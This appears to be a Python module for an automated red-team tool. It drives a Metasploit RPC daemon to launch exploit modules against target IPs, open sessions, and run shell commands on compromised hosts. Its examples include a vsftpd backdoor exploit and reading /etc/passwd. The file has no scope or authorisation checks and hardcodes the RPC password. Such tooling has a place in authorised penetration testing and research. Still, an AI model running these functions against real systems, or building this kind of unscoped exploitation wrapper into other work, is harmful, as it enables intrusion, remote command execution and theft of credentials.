"""
metasploit_tool.py — Stateful Metasploit RPC integration.

Connects to a running msfrpcd daemon via pymetasploit3.
Provides: exploit execution, session listing, command execution in sessions.

Start msfrpcd before use:
    msfrpcd -P autoredteam -S -a 127.0.0.1 -p 55553
"""
import json
import time
import re
from typing import Optional

try:
    from pymetasploit3.msfrpc import MsfRpcClient
    HAS_MSF = True
except ImportError:
    HAS_MSF = False

# Connection defaults — match msfrpcd startup flags
MSF_HOST     = "127.0.0.1"
MSF_PORT     = 55553
MSF_PASSWORD = "autoredteam"
MSF_SSL      = False

# Module-level cached client
_client: Optional[object] = None


def _get_client():
    """Return a cached or freshly connected MsfRpcClient."""
    global _client
    if not HAS_MSF:
        raise RuntimeError("pymetasploit3 not installed — run: pip install pymetasploit3")

    if _client is None:
        try:
            _client = MsfRpcClient(
                MSF_PASSWORD,
                host=MSF_HOST,
                port=MSF_PORT,
                ssl=MSF_SSL,
            )
        except Exception as e:
            raise RuntimeError(
                f"Cannot connect to msfrpcd at {MSF_HOST}:{MSF_PORT} — "
                f"start it with: msfrpcd -P {MSF_PASSWORD} -S -a {MSF_HOST} -p {MSF_PORT}\n"
                f"Error: {e}"
            )
    return _client


# ── Public tool functions ────────────────────────────────────


def run_exploit(module: str, rhosts: str, lhost: str, options: dict = None) -> dict:
    """
    Execute a Metasploit exploit module and wait for a session.

    Args:
        module:  MSF module path (e.g. "exploit/unix/ftp/vsftpd_234_backdoor")
        rhosts:  Target IP or range
        lhost:   Attacker IP (your machine's IP on the target network)
        options: Extra module options dict (e.g. {"RPORT": "21"})

    Returns:
        dict with keys: module, rhosts, lhost, session_id, session_type,
                        session_info, output, error
    """
    try:
        client = _get_client()
    except RuntimeError as e:
        return {"error": str(e), "module": module, "rhosts": rhosts}

    options = options or {}
    result = {
        "module":       module,
        "rhosts":       rhosts,
        "lhost":        lhost,
        "session_id":   None,
        "session_type": None,
        "session_info": {},
        "output":       "",
        "error":        None,
    }

    try:
        # Create a console and run the exploit
        console = client.consoles.console()
        time.sleep(1)

        # Build the MSF console commands
        cmd_block = "\n".join([
            f"use {module}",
            f"set RHOSTS {rhosts}",
            f"set LHOST {lhost}",
            f"set PAYLOAD_TYPE auto",
        ])
        for k, v in options.items():
            cmd_block += f"\nset {k} {v}"
        cmd_block += "\nrun -z\n"

        console.write(cmd_block)

        # Poll for output — up to 90s, stop early on terminal conditions
        output_buf = ""
        idle_ticks = 0
        for _ in range(45):
            time.sleep(2)
            data = console.read()
            chunk = data.get("data", "")
            if chunk:
                output_buf += chunk
                idle_ticks = 0
            else:
                idle_ticks += 1

            lower = output_buf.lower()
            # Success
            if "session" in lower and "opened" in lower:
                time.sleep(2)  # let session stabilise
                output_buf += console.read().get("data", "")
                break
            # Definitive failure
            if any(x in lower for x in ("no session was created", "exploit aborted", "no session")):
                break
            # Idle for 8s after seeing "exploit completed" → done
            if "exploit completed" in lower and idle_ticks >= 4:
                break

        result["output"] = output_buf.strip()

        # Extract session ID from output
        m = re.search(r"session (\d+) opened", output_buf, re.IGNORECASE)
        if m:
            session_id = int(m.group(1))
            result["session_id"] = session_id

            # Get session details
            sessions = client.sessions.list
            if str(session_id) in sessions:
                sess = sessions[str(session_id)]
                result["session_type"] = sess.get("type", "unknown")
                result["session_info"] = {
                    "tunnel":  sess.get("tunnel_local", ""),
                    "target":  sess.get("tunnel_peer", ""),
                    "via":     sess.get("via_exploit", module),
                    "arch":    sess.get("arch", ""),
                    "platform": sess.get("platform", ""),
                }
        else:
            result["error"] = "No session opened — exploit may have failed or target is patched"

        console.destroy()

    except Exception as e:
        result["error"] = str(e)

    return result


def list_sessions() -> dict:
    """
    List all active Metasploit sessions.

    Returns:
        dict with keys: sessions (list), session_count, error
    """
    try:
        client = _get_client()
    except RuntimeError as e:
        return {"error": str(e), "sessions": []}

    try:
        raw = client.sessions.list
        sessions = []
        for sid, info in raw.items():
            sessions.append({
                "session_id":   int(sid),
                "type":         info.get("type", "unknown"),
                "tunnel":       info.get("tunnel_peer", ""),
                "via_exploit":  info.get("via_exploit", ""),
                "platform":     info.get("platform", ""),
                "arch":         info.get("arch", ""),
            })
        return {
            "sessions":      sessions,
            "session_count": len(sessions),
            "error":         None,
        }
    except Exception as e:
        return {"error": str(e), "sessions": []}


def run_session_command(session_id: int, command: str, timeout: int = 15) -> dict:
    """
    Execute a shell command inside an active Metasploit session.

    Args:
        session_id: The numeric session ID from run_exploit or list_sessions
        command:    Shell command to run (e.g. "id", "uname -a", "cat /etc/passwd")
        timeout:    Seconds to wait for output (default 15)

    Returns:
        dict with keys: session_id, command, output, error
    """
    try:
        client = _get_client()
    except RuntimeError as e:
        return {"error": str(e), "session_id": session_id, "command": command}

    try:
        session = client.sessions.session(str(session_id))
        session.write(command + "\n")

        output = ""
        for _ in range(timeout):
            time.sleep(1)
            chunk = session.read()
            output += chunk
            if output.strip():
                # Give a bit more time for full output
                time.sleep(2)
                output += session.read()
                break

        return {
            "session_id": session_id,
            "command":    command,
            "output":     output.strip(),
            "error":      None,
        }
    except Exception as e:
        return {
            "session_id": session_id,
            "command":    command,
            "output":     "",
            "error":      str(e),
        }


def check_msfrpcd_running() -> dict:
    """Check if msfrpcd is reachable and return version info."""
    try:
        client = _get_client()
        version = client.core.version
        return {
            "running":  True,
            "version":  version.get("version", "unknown"),
            "ruby":     version.get("ruby", "unknown"),
            "api":      version.get("api", "unknown"),
            "error":    None,
        }
    except Exception as e:
        return {
            "running": False,
            "error":   str(e),
            "hint":    f"Start msfrpcd with: msfrpcd -P {MSF_PASSWORD} -S -a {MSF_HOST} -p {MSF_PORT}",
        }
